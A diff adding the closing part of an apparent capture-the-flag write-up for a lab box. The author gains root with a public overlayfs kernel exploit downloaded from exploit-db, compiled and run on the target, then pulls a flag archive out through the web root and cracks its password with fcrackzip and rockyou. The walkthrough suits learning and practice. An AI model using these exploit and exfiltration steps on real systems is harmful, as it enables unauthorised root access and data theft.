@@ -135,3 +135,88 @@ luigi
 ```
 
 ## Kernel privilege escalation
+
+After lot of enumeration, i found nothing. I usually avoid to exploit old kernel versions, but on this box it's the only way to gain a root shell. So let's check kernel version :
+
+```
+luigi@supermariohost:~$ uname -a
+Linux supermariohost 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+luigi@supermariohost:~$ uname -r
+3.13.0-32-generic
+```
+
+Because it's an old box, we can see uses a really old kernel. Let's search for possible exploits with searchsploit.
+
+```
+$ searchsploit 3.13.0
+---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                    |  Path
+---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                              | linux/local/37292.c
+```
+
+This seems perfect, let's download it on target box & compile it.
+
+```
+luigi@supermariohost:/tmp$ wget -q https://www.exploit-db.com/download/37292 -O root.c
+luigi@supermariohost:/tmp$ gcc root.c -o root
+luigi@supermariohost:/tmp$ chmod +x root; ./root
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# whoami;id
+root
+uid=0(root) gid=0(root) groups=0(root),112(lshell),1001(luigi)
+```
+
+## Cracking .zip & grab the flag
+
+Now let challenge isnt over, we can see under `/root` directory a `.zip` :
+
+```
+# ls
+Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos  flag.zip
+```
+
+Probably we have to crack it & grab the flag, let's move it to `/var/www/html` so we can download it.
+
+```
+# mv flag.zip /var/www/html
+```
+
+In our box now :
+
+```
+$ wget -q $ip:8180/flag.zip
+$ file flag.zip 
+flag.zip: Zip archive data, at least v2.0 to extract
+$ unzip flag.zip 
+Archive:  flag.zip
+```
+
+We have to crack it, i'll use `fcrackzip` :
+
+```
+$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt flag.zip 
+
+
+PASSWORD FOUND!!!!: pw == ilovepeach
+$ unzip -P ilovepeach flag.zip 
+Archive:  flag.zip
+  inflating: flag.txt                
+$ cat flag.txt 
+Well done :D If you reached this it means you got root, congratulations.
+Now, there are multiple ways to hack this machine. The goal is to get all the passwords of all the users in this machine. If you did it, then congratulations, I hope you had fun :D
+
+Keep in touch on twitter through @mr_h4sh
+
+Congratulations again!
+								
+mr_h4sh
+```
+
+awesome box! brings back lot of memories.
+
